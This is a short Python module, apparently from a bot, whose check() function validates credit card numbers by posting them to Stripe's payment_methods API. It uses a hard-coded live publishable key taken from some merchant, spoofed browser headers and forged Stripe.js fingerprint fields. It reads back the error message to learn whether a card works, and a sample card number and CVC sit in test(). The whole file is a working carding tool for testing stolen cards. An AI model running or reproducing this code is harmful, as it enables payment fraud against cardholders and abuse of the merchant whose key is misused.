import requests
from ..core.logger import logging

LOGS = logging.getLogger(__name__)

print("imported stripe")

def check(ccn, month, year, cvc):
    """Checks credit cards."""

    s = requests.session()

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept-Language": "en-US,en;q=0.9",
    }

    payload = {
        "type": "card",
        "billing_details[name]": "Seon cc",
        "card[number]": ccn,
        "card[cvc]": cvc,
        "card[exp_month]": month,
        "card[exp_year]": year,
        "guid": "9253315b-1a39-478e-9e6d-5a40a5c72e23bea1ca",
        "muid": "89540ccb-7f39-45fa-8b65-6983aa5295f4f9720d",
        "sid": "a5682bb6-f9aa-44c6-b97e-0655e59e8800a9f8f7",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js%2F97dd66212%3B+stripe-js-v3%2F97dd66212",
        "time_on_page": "185000",
        "key": "pk_live_51CUoguFFMpxKxk7UfeKkkhB208gCqN6afPs5CnUGOGyjvNkfbyAE7uGLJxN8BGTmDxBj8g3SK8FS0ffTxp4iT8ZK00EcixeE0Q",
    }

    res = s.post(
        "https://api.stripe.com/v1/payment_methods", headers=headers, data=payload
    ).json()

    try:
        return res["error"]["message"]
    except KeyError:
        LOGS.error(res)
        return None


def test():
    check("5495572132207365", "08", "2027", "781")


if __name__ == "__main__":
    test()
